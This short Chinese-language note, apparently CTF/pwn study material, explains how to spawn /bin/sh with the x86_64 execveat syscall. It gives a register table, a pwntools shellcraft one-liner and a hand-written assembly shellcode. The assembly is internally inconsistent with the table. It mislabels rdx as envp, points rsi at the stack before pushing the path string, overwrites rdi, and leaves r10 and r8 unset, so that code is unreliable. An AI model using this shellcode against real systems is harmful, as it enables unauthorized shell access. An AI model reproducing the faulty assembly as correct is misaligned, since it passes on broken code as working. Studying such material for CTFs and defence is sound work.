### 1. execveat 

`execveat` 的 ROP 和 `execve` 类似，但参数寄存器不同。以 **x86_64 Linux** 为例：

```cpp
execveat(int dirfd, const char *pathname,char *const argv[], char *const envp[],int flags);
```
syscall 约定：

| 参数             | 寄存器   | 值                                        |
| -------------- | ----- | ---------------------------------------- |
| syscall number | `rax` | `322`                                    |
| `dirfd`        | `rdi` | `AT_FDCWD = -100`，即 `0xffffffffffffff9c` |
| `pathname`     | `rsi` | `"/bin/sh"` 地址                           |
| `argv`         | `rdx` | `argv` 数组地址，或某些题里可用 `0`                  |
| `envp`         | `r10` | `0`                                      |
| `flags`        | `r8`  | `0`                                      |

**pwntools 一行生成 shellcode**

```python
from pwn import *
context(arch='amd64', os='linux')
shellcode = shellcraft.execveat(-100, b'/bin/sh', [b'/bin/sh'], 0)
print(shellcode)
# 或者直接 asm(shellcraft.execveat(...))
```

**手写汇编版**：

```asm
xor rdx, rdx          ; envp = NULL
push rdx
mov rsi, rsp          ; argv = ["/bin/sh", NULL]
push 0x68732f6e69622f2f  ; "//bin/sh"
mov rdi, rsp
mov rax, 322          ; execveat syscall
mov rdi, -100         ; AT_FDCWD
syscall
```
